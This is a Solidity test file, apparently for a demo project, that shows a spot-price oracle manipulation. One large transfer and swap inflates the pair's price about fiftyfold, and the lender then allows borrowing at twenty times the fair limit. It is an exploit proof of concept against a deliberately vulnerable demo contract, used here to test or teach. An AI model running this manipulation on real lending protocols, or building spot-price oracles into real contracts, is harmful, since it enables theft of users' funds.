// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestBase} from "./utils/TestBase.sol";
import {PlainToken} from "../src/demo/PlainToken.sol";
import {DemoPair, SpotOracleLender, IERC20Like} from "../src/demo/SpotOracleLender.sol";

contract SpotOracleLenderTest is TestBase {
    PlainToken coll;
    PlainToken debt;
    DemoPair pair;
    SpotOracleLender lender;

    function setUp() public {
        coll = new PlainToken(1_000_000e18);
        debt = new PlainToken(1_000_000e18);
        pair = new DemoPair(IERC20Like(address(coll)), IERC20Like(address(debt)));
        coll.transfer(address(pair), 1_000e18);
        debt.transfer(address(pair), 1_000e18);
        pair.sync();
        lender = new SpotOracleLender(pair);
        debt.transfer(address(lender), 100_000e18);
    }

    /// One large swap moves the spot price, then the lender over-lends against it.
    function test_spotPriceManipulationOverBorrows() public {
        uint256 fair = lender.price();
        // push debt token into the pair -> collateral looks more valuable
        debt.transfer(address(pair), 9_000e18);
        pair.swap(900e18, 0, address(this));
        uint256 inflated = lender.price();
        assertTrue(inflated > fair * 50, "price did not move");

        coll.approve(address(lender), type(uint256).max);
        lender.depositCollateral(10e18);
        uint256 fairLimit = (10e18 * fair * 80) / 100 / 1e18;
        uint256 borrowAmount = fairLimit * 20;
        lender.borrow(borrowAmount);
        assertTrue(lender.debtOf(address(this)) > fairLimit * 10, "no over-borrow");
    }
}
